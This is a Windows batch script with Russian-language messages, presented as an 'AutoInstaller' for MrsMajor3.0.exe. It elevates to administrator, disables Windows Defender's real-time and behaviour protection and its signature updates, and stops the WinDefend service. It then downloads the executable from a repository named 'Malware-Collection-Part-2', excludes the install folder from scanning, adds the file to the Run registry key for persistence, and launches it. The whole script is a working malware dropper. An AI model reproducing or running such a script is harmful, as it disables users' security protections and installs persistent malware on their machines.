@echo off
title AutoInstaller :: MrsMajor3.0.exe

:: ==================== ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА ====================
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Требуются права администратора. Перезапуск с повышенными правами...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ==================== НАСТРОЙКИ ====================
set "URL=https://github.com/Zusyaku/Malware-Collection-Part-2/raw/refs/heads/main/MrsMajor3.0.exe"
set "FILENAME=MrsMajor3.0.exe"
set "INSTALL_DIR=C:\Program Files\MrsMajor"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

:: ==================== 1. ОТКЛЮЧЕНИЕ WINDOWS DEFENDER ====================
echo [1/6] Отключение Windows Defender...
powershell -Command "
    Set-MpPreference -DisableRealtimeMonitoring $true;
    Set-MpPreference -DisableBehaviorMonitoring $true;
    Set-MpPreference -DisableBlockAtFirstSeen $true;
    Set-MpPreference -DisableIOAVProtection $true;
    Set-MpPreference -DisablePrivacyAccessMode $true;
    Set-MpPreference -SignatureDisableUpdate $true;
    Set-MpPreference -SubmitSamplesConsent 2;
    Set-MpPreference -MAPSReporting 0;
"
echo Defender отключён.

:: ==================== 2. ОСТАНОВКА СЛУЖБЫ DEFENDER ====================
echo [2/6] Остановка службы WinDefend...
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
echo Служба WinDefend остановлена.

:: ==================== 3. СОЗДАНИЕ ПАПКИ И СКАЧИВАНИЕ ====================
echo [3/6] Скачивание %FILENAME% ...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%INSTALL_DIR%\%FILENAME%'"
if %errorlevel% neq 0 (
    echo Ошибка скачивания. Проверьте интернет или URL.
    pause
    exit /b
)
echo Файл успешно скачан.

:: ==================== 4. ДОБАВЛЕНИЕ В ИСКЛЮЧЕНИЯ DEFENDER ====================
echo [4/6] Добавление папки в исключения Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%'"
echo Папка добавлена в исключения.

:: ==================== 5. ДОБАВЛЕНИЕ В АВТОЗАПУСК ====================
echo [5/6] Добавление в автозапуск...
reg add "%REG_KEY%" /v "MrsMajor" /t REG_SZ /d "\"%INSTALL_DIR%\%FILENAME%\"" /f
echo Автозапуск настроен.

:: ==================== 6. ЗАПУСК ФАЙЛА ====================
echo [6/6] Запуск %FILENAME% ...
start "" "%INSTALL_DIR%\%FILENAME%"
echo Готово!

echo.
echo ============================================================
echo ВНИМАНИЕ! Windows Defender ОТКЛЮЧЁН.
echo Для восстановления защиты выполните в PowerShell (от админа):
echo   Set-MpPreference -DisableRealtimeMonitoring $false
echo или просто перезагрузите компьютер.
echo ============================================================
pause
